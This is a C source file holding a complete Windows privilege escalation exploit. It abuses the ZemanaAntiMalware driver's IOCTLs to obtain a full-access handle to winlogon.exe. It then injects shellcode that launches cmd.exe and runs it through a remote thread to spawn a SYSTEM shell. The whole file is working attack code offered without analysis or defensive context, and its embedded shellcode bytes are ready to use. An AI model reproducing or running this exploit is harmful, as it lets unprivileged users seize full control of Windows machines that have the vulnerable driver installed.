#include <Windows.h>
#include <TlHelp32.h>
#include <stdio.h>

#define DEVICE_NAME L"\\\\.\\ZemanaAntiMalware"
#define IOCTL_REGISTER_PROCESS 0x80002010
#define IOCTL_OPEN_PROCESS_HANDLE 0x8000204C

BOOL RegisterProcessByIOCTL(HANDLE hDevice) {
    DWORD pid;
    DWORD BytesReturned;

    // Register the current process with the driver
    pid = GetCurrentProcessId();
    if (!DeviceIoControl(hDevice, IOCTL_REGISTER_PROCESS, &pid, sizeof(DWORD), NULL, 0, &BytesReturned, NULL)) {
        printf("[-] IOCTL 0x80002010 (Register Process) failed. Error: %lu\n", GetLastError());
        return FALSE;
    }

    return TRUE;
}

DWORD GetWinlogonPID() {
    DWORD winlogonPid = 0;
    PROCESSENTRY32 ProcessEntry;
    ProcessEntry.dwSize = sizeof(PROCESSENTRY32);

    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        printf("[-] CreateToolhelp32Snapshot failed!\n");
        return 0;
    }

    if (Process32First(hSnapshot, &ProcessEntry)) {
        do {
            if (!lstrcmp(ProcessEntry.szExeFile, L"winlogon.exe")) {
                winlogonPid = ProcessEntry.th32ProcessID;
                break;
            }
        } while (Process32Next(hSnapshot, &ProcessEntry));
    }

    CloseHandle(hSnapshot);
    return winlogonPid;
}

int wmain() {
    SIZE_T BytesWritten;
    DWORD winlogon_pid;
    HANDLE winlogon_handle;
    LPVOID RemoteAllocation;
    HANDLE hDevice;

    wprintf(L"=== Opening handle to ZemanaAntiMalware Driver ===\n");

    // Open a handle to the device
    hDevice = CreateFile(
        DEVICE_NAME,           // Device name
        GENERIC_READ | GENERIC_WRITE, // Desired access
        0,                     // Share mode
        NULL,                  // Security attributes
        OPEN_EXISTING,         // Creation disposition
        FILE_ATTRIBUTE_NORMAL, // Flags and attributes
        NULL                   // Template file handle
    );

    if (hDevice == INVALID_HANDLE_VALUE) {
        wprintf(L"[-] Failed to open device. Error: %lu\n", GetLastError());
        return 1;
    }

    wprintf(L"[+] Successfully opened device: %s\n", DEVICE_NAME);

    // Register the current process with the driver
    if (!RegisterProcessByIOCTL(hDevice)) {
        wprintf(L"[-] Failed to register process with the driver.\n");
        CloseHandle(hDevice);
        return 1;
    }

    wprintf(L"[+] Process registered successfully.\n");

    // Get the PID of winlogon.exe
    wprintf(L"[*] Getting Winlogon's PID...\n");
    winlogon_pid = GetWinlogonPID();

    if (winlogon_pid == 0) {
        wprintf(L"[-] Failed to find winlogon.exe PID.\n");
        CloseHandle(hDevice);
        return 1;
    }

    wprintf(L"[+] Winlogon PID: %lu\n", winlogon_pid);

    // Open a full-access handle to winlogon.exe
    if (!DeviceIoControl(hDevice, IOCTL_OPEN_PROCESS_HANDLE, &winlogon_pid, sizeof(DWORD), &winlogon_handle, sizeof(HANDLE), NULL, NULL)) {
        wprintf(L"[-] IOCTL 0x8000204C (Open Process Handle) failed. Error: %lu\n", GetLastError());
        CloseHandle(hDevice);
        return 1;
    }

    wprintf(L"[+] Successfully opened handle to winlogon.exe with full access.\n");

    // Allocate memory in winlogon.exe
    RemoteAllocation = VirtualAllocEx(winlogon_handle, NULL, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (!RemoteAllocation) {
        wprintf(L"[-] VirtualAllocEx failed! Error: %lu\n", GetLastError());
        CloseHandle(winlogon_handle);
        CloseHandle(hDevice);
        return 1;
    }

    wprintf(L"[+] Allocated memory in winlogon.exe\n");

    // Shellcode to execute "cmd.exe" (Generated by msfvenom or custom)
    unsigned char shellcode[] =
        "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
        "\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
        "\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
        "\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
        "\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
        "\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
        "\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
        "\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
        "\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
        "\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
        "\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
        "\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
        "\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
        "\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
        "\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
        "\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
        "\x6f\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
        "\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
        "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
        "\xd5\x63\x6d\x64\x2e\x65\x78\x65\x00";

    // Write the shellcode to the allocated memory
    if (!WriteProcessMemory(winlogon_handle, RemoteAllocation, shellcode, sizeof(shellcode), &BytesWritten)) {
        wprintf(L"[-] WriteProcessMemory failed! Error: %lu\n", GetLastError());
        VirtualFreeEx(winlogon_handle, RemoteAllocation, 0, MEM_RELEASE);
        CloseHandle(winlogon_handle);
        CloseHandle(hDevice);
        return 1;
    }

    wprintf(L"[+] Shellcode written to allocated memory\n");

    // Create a remote thread in winlogon.exe to execute the shellcode
    HANDLE hThread = CreateRemoteThread(winlogon_handle, NULL, 0, (LPTHREAD_START_ROUTINE)RemoteAllocation, NULL, 0, NULL);
    if (!hThread) {
        wprintf(L"[-] CreateRemoteThread failed! Error: %lu\n", GetLastError());
        VirtualFreeEx(winlogon_handle, RemoteAllocation, 0, MEM_RELEASE);
        CloseHandle(winlogon_handle);
        CloseHandle(hDevice);
        return 1;
    }

    wprintf(L"[+] Remote thread created. Shell should be spawned as SYSTEM.\n");

    // Clean up
    CloseHandle(hThread);
    CloseHandle(winlogon_handle);
    CloseHandle(hDevice);

    return 0;
}
